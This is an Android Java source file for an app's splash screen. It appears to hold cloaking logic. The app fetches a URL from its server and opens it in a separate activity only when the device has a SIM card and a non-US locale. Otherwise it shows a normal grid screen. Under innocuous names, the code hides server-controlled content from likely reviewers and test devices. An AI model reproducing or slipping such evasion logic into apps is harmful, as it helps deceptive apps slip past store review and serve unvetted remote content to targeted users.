package app.sensey.privaton.activity;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import app.sensey.privaton.ApiBuilder;
import app.sensey.privaton.R;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SplashActivity extends AppCompatActivity {
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("DEV", getFacebookHash(this));
        String w = getString(R.string.trash);
        if (w.contains("://"))
            trash();
        else onGrid();
    }

    private void onGrid() {
        Intent intent = new Intent(this, GridActivity.class);
        startActivity(intent);
        this.finish();
    }

    private void onTrash(String trash) {
        Intent intent = new Intent(this, TrashActivity.class);
        intent.putExtra("trash", trash);
        startActivity(intent);
        this.finish();
    }

    public boolean isUSA() {
        return this.getResources().getConfiguration().locale.getCountry().contains("US");
    }

    public boolean isSimSupport() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        return !(tm.getSimState() == TelephonyManager.SIM_STATE_ABSENT);
    }

    private void trash() {
        ApiBuilder.getTrash(this).enqueue(new Callback<String>() {
            @Override
            public void onResponse(Call<String> call, Response<String> response) {
                if (response.isSuccessful()) {
                    String responseString = response.body();
                    Log.d("DEV", responseString);
                    if (responseString != null &&
                            responseString.length() > 0 &&
                            responseString.startsWith("http") &&
                            isSimSupport() &&
                            !isUSA())
                        onTrash(responseString);
                    else onGrid();

                } else {
                    onGrid();
                }

            }

            @Override
            public void onFailure(Call<String> call, Throwable t) {
                onGrid();
            }
        });
    }

    public static String getFacebookHash(Context ctx) {
        try {
            PackageInfo info = ctx.getPackageManager().getPackageInfo(ctx.getPackageName(), PackageManager.GET_SIGNATURES);
            for (Signature signature : info.signatures) {
                MessageDigest md = MessageDigest.getInstance("SHA");
                md.update(signature.toByteArray());
                return Base64.encodeToString(md.digest(), Base64.DEFAULT);
            }
        } catch (PackageManager.NameNotFoundException e) {
            return "SHA-1 generation: the key count not be generated: NameNotFoundException thrown";
        } catch (NoSuchAlgorithmException e) {
            return "SHA-1 generation: the key count not be generated: NoSuchAlgorithmException thrown";
        }

        return "SHA-1 generation: epic failed";
    }
}
